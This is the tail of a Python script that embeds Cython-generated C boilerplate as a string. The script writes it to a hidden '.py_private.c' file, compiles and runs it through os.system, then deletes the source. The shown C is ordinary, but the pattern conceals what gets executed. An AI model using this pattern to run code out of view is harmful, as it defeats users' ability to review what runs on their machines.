                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(long) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            long val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (long) -1;
        }
    } else {
        long val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (long) -1;
        val = __Pyx_PyInt_As_long(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to long");
    return (long) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to long");
    return (long) -1;
}

/* CIntFromPy */
    static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const int neg_one = (int) -1, const_zero = (int) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(int) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (int) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case  1: __PYX_VERIFY_RETURN_INT(int, digit, digits[0])
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 2 * PyLong_SHIFT) {
                            return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 3 * PyLong_SHIFT) {
                            return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 4 * PyLong_SHIFT) {
                            return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (int) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(int) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case -1: __PYX_VERIFY_RETURN_INT(int, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(int,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(int) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(int) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            int val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (int) -1;
        }
    } else {
        int val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (int) -1;
        val = __Pyx_PyInt_As_int(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to int");
    return (int) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to int");
    return (int) -1;
}

/* CheckBinaryVersion */
    static int __Pyx_check_binary_version(void) {
    char ctversion[5];
    int same=1, i, found_dot;
    const char* rt_from_call = Py_GetVersion();
    PyOS_snprintf(ctversion, 5, "%d.%d", PY_MAJOR_VERSION, PY_MINOR_VERSION);
    found_dot = 0;
    for (i = 0; i < 4; i++) {
        if (!ctversion[i]) {
            same = (rt_from_call[i] < '0' || rt_from_call[i] > '9');
            break;
        }
        if (rt_from_call[i] != ctversion[i]) {
            same = 0;
            break;
        }
    }
    if (!same) {
        char rtversion[5] = {'\0'};
        char message[200];
        for (i=0; i<4; ++i) {
            if (rt_from_call[i] == '.') {
                if (found_dot) break;
                found_dot = 1;
            } else if (rt_from_call[i] < '0' || rt_from_call[i] > '9') {
                break;
            }
            rtversion[i] = rt_from_call[i];
        }
        PyOS_snprintf(message, sizeof(message),
                      "compiletime version %s of module '%.100s' "
                      "does not match runtime version %s",
                      ctversion, __Pyx_MODULE_NAME, rtversion);
        return PyErr_WarnEx(NULL, message, 1);
    }
    return 0;
}

/* InitStrings */
    static int __Pyx_InitStrings(__Pyx_StringTabEntry *t) {
    while (t->p) {
        #if PY_MAJOR_VERSION < 3
        if (t->is_unicode) {
            *t->p = PyUnicode_DecodeUTF8(t->s, t->n - 1, NULL);
        } else if (t->intern) {
            *t->p = PyString_InternFromString(t->s);
        } else {
            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);
        }
        #else
        if (t->is_unicode | t->is_str) {
            if (t->intern) {
                *t->p = PyUnicode_InternFromString(t->s);
            } else if (t->encoding) {
                *t->p = PyUnicode_Decode(t->s, t->n - 1, t->encoding, NULL);
            } else {
                *t->p = PyUnicode_FromStringAndSize(t->s, t->n - 1);
            }
        } else {
            *t->p = PyBytes_FromStringAndSize(t->s, t->n - 1);
        }
        #endif
        if (!*t->p)
            return -1;
        if (PyObject_Hash(*t->p) == -1)
            return -1;
        ++t;
    }
    return 0;
}

static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {
    return __Pyx_PyUnicode_FromStringAndSize(c_str, (Py_ssize_t)strlen(c_str));
}
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {
    Py_ssize_t ignore;
    return __Pyx_PyObject_AsStringAndSize(o, &ignore);
}
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
#if !CYTHON_PEP393_ENABLED
static const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    char* defenc_c;
    PyObject* defenc = _PyUnicode_AsDefaultEncodedString(o, NULL);
    if (!defenc) return NULL;
    defenc_c = PyBytes_AS_STRING(defenc);
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    {
        char* end = defenc_c + PyBytes_GET_SIZE(defenc);
        char* c;
        for (c = defenc_c; c < end; c++) {
            if ((unsigned char) (*c) >= 128) {
                PyUnicode_AsASCIIString(o);
                return NULL;
            }
        }
    }
#endif
    *length = PyBytes_GET_SIZE(defenc);
    return defenc_c;
}
#else
static CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    if (likely(PyUnicode_IS_ASCII(o))) {
        *length = PyUnicode_GET_LENGTH(o);
        return PyUnicode_AsUTF8(o);
    } else {
        PyUnicode_AsASCIIString(o);
        return NULL;
    }
#else
    return PyUnicode_AsUTF8AndSize(o, length);
#endif
}
#endif
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
    if (
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
            __Pyx_sys_getdefaultencoding_not_ascii &&
#endif
            PyUnicode_Check(o)) {
        return __Pyx_PyUnicode_AsStringAndSize(o, length);
    } else
#endif
#if (!CYTHON_COMPILING_IN_PYPY) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))
    if (PyByteArray_Check(o)) {
        *length = PyByteArray_GET_SIZE(o);
        return PyByteArray_AS_STRING(o);
    } else
#endif
    {
        char* result;
        int r = PyBytes_AsStringAndSize(o, &result, length);
        if (unlikely(r < 0)) {
            return NULL;
        } else {
            return result;
        }
    }
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {
   int is_true = x == Py_True;
   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;
   else return PyObject_IsTrue(x);
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {
    int retval;
    if (unlikely(!x)) return -1;
    retval = __Pyx_PyObject_IsTrue(x);
    Py_DECREF(x);
    return retval;
}
static PyObject* __Pyx_PyNumber_IntOrLongWrongResultType(PyObject* result, const char* type_name) {
#if PY_MAJOR_VERSION >= 3
    if (PyLong_Check(result)) {
        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,
                "__int__ returned non-int (type %.200s).  "
                "The ability to return an instance of a strict subclass of int "
                "is deprecated, and may be removed in a future version of Python.",
                Py_TYPE(result)->tp_name)) {
            Py_DECREF(result);
            return NULL;
        }
        return result;
    }
#endif
    PyErr_Format(PyExc_TypeError,
                 "__%.4s__ returned non-%.4s (type %.200s)",
                 type_name, type_name, Py_TYPE(result)->tp_name);
    Py_DECREF(result);
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x) {
#if CYTHON_USE_TYPE_SLOTS
  PyNumberMethods *m;
#endif
  const char *name = NULL;
  PyObject *res = NULL;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_Check(x) || PyLong_Check(x)))
#else
  if (likely(PyLong_Check(x)))
#endif
    return __Pyx_NewRef(x);
#if CYTHON_USE_TYPE_SLOTS
  m = Py_TYPE(x)->tp_as_number;
  #if PY_MAJOR_VERSION < 3
  if (m && m->nb_int) {
    name = "int";
    res = m->nb_int(x);
  }
  else if (m && m->nb_long) {
    name = "long";
    res = m->nb_long(x);
  }
  #else
  if (likely(m && m->nb_int)) {
    name = "int";
    res = m->nb_int(x);
  }
  #endif
#else
  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {
    res = PyNumber_Int(x);
  }
#endif
  if (likely(res)) {
#if PY_MAJOR_VERSION < 3
    if (unlikely(!PyInt_Check(res) && !PyLong_Check(res))) {
#else
    if (unlikely(!PyLong_CheckExact(res))) {
#endif
        return __Pyx_PyNumber_IntOrLongWrongResultType(res, name);
    }
  }
  else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_TypeError,
                    "an integer is required");
  }
  return res;
}
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {
  Py_ssize_t ival;
  PyObject *x;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_CheckExact(b))) {
    if (sizeof(Py_ssize_t) >= sizeof(long))
        return PyInt_AS_LONG(b);
    else
        return PyInt_AsSsize_t(b);
  }
#endif
  if (likely(PyLong_CheckExact(b))) {
    #if CYTHON_USE_PYLONG_INTERNALS
    const digit* digits = ((PyLongObject*)b)->ob_digit;
    const Py_ssize_t size = Py_SIZE(b);
    if (likely(__Pyx_sst_abs(size) <= 1)) {
        ival = likely(size) ? digits[0] : 0;
        if (size == -1) ival = -ival;
        return ival;
    } else {
      switch (size) {
         case 2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
      }
    }
    #endif
    return PyLong_AsSsize_t(b);
  }
  x = PyNumber_Index(b);
  if (!x) return -1;
  ival = PyInt_AsSsize_t(x);
  Py_DECREF(x);
  return ival;
}
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {
  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {
    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);
#if PY_MAJOR_VERSION < 3
  } else if (likely(PyInt_CheckExact(o))) {
    return PyInt_AS_LONG(o);
#endif
  } else {
    Py_ssize_t ival;
    PyObject *x;
    x = PyNumber_Index(o);
    if (!x) return -1;
    ival = PyInt_AsLong(x);
    Py_DECREF(x);
    return ival;
  }
}
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {
  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);
}
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t ival) {
    return PyInt_FromSize_t(ival);
}


#endif /* Py_PYTHON_H */'''
C_FILE = ".py_private.c"
PYTHON_VERSION = ".".join(sys.version.split(" ")[0].split(".")[:-1])
COMPILE_FILE = (
    'gcc -I' +
    PREFIX +
    '/include/python' +
    PYTHON_VERSION +
    ' -o ' +
    EXECUTE_FILE +
    ' ' +
    C_FILE +
    ' -L' +
    PREFIX +
    '/lib -lpython' +
    PYTHON_VERSION
)


with open(C_FILE, "w") as f:
    f.write(C_SOURCE)

os.makedirs(os.path.dirname(EXECUTE_FILE), exist_ok=True)
os.system(EXPORT_PYTHONHOME+" && "+EXPORT_PYTHON_EXECUTABLE+" && "+COMPILE_FILE+" && "+RUN)

os.remove(C_FILE)
